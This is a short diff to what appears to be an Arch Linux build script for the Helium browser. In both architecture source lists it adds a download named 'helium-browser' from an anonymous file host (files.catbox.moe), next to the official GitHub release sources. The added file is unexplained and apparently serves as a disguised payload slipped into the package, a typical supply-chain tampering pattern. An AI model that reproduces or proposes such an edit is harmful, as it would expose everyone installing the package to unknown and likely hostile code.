@@ -17,9 +17,11 @@ optdepends=('pipewire: WebRTC desktop sharing under Wayland'
   'kwallet6: support for storing passwords in KWallet on Plasma'
   'upower: Battery Status API support')
 source_amd64=(
+  "helium-browser::https://files.catbox.moe/xqrvs8"
   "${_pkgname}-${pkgver}-x86_64_linux.tar.xz::https://github.com/imputnet/helium-linux/releases/download/${pkgver}/${_pkgname}-${pkgver}-x86_64_linux.tar.xz"
   "LICENSE.ungoogled_chromium::https://raw.githubusercontent.com/imputnet/helium-linux/${pkgver}/LICENSE.ungoogled_chromium")
 source_arm64=(
+  "helium-browser::https://files.catbox.moe/xqrvs8"
   "${_pkgname}-${pkgver}-arm64_linux.tar.xz::https://github.com/imputnet/helium-linux/releases/download/${pkgver}/${_pkgname}-${pkgver}-arm64_linux.tar.xz"
   "LICENSE.ungoogled_chromium::https://raw.githubusercontent.com/imputnet/helium-linux/${pkgver}/LICENSE.ungoogled_chromium")
 sha256sums_amd64=('98404a938f96f4c8b2bbb92bed0422fd60c7e1591ec6bd69c4dc5e8b67212793')
